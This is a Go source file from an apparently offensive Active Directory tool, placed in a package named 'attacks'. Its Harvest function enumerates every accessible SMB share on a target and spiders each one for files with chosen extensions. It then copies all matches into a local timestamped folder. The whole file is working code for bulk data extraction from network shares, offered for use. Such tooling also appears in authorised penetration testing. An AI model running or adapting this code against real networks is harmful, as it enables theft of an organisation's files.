package attacks

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"adreaper/internal/config"
	"adreaper/internal/output"
	"adreaper/internal/recon"
)

// Harvest searches for and extracts files by extension from all accessible SMB shares.
func Harvest(ctx context.Context, opts *config.Options, extensions []string) error {
	output.Info("Starting File Harvesting across all shares...")
	output.Info("Target extensions: %v", extensions)

	smbCl, err := recon.NewSMBClient(opts)
	if err != nil {
		return err
	}
	defer smbCl.Close()

	shares, err := smbCl.ListShares()
	if err != nil {
		return fmt.Errorf("list shares: %w", err)
	}

	harvestDir := fmt.Sprintf("harvest_%s", time.Now().Format("20060102_150405"))
	if err := os.MkdirAll(harvestDir, 0755); err != nil {
		return fmt.Errorf("create harvest dir: %w", err)
	}

	foundCount := 0
	for _, sh := range shares {
		if sh.Access == "DENIED" || sh.Name == "IPC$" {
			continue
		}

		output.Info("Spidering share: %s", sh.Name)

		err := smbCl.Spider(sh.Name, extensions, func(path string, data []byte) {
			foundCount++

			// Save file locally
			localPath := filepath.Join(harvestDir, sh.Name, path)
			localDir := filepath.Dir(localPath)

			if err := os.MkdirAll(localDir, 0755); err != nil {
				output.Warn("  [!] Failed to create local dir: %v", err)
				return
			}

			if err := os.WriteFile(localPath, data, 0644); err != nil {
				output.Warn("  [!] Failed to save file %s: %v", path, err)
			} else {
				output.Success("  [+] Extracted: %s\\%s", sh.Name, path)
			}
		})

		if err != nil {
			output.Warn("  [!] Error spidering %s: %v", sh.Name, err)
		}
	}

	if foundCount > 0 {
		output.Success("Harvesting complete! %d files saved to: %s", foundCount, harvestDir)
	} else {
		output.Info("No files found matching extensions %v", extensions)
	}

	return nil
}
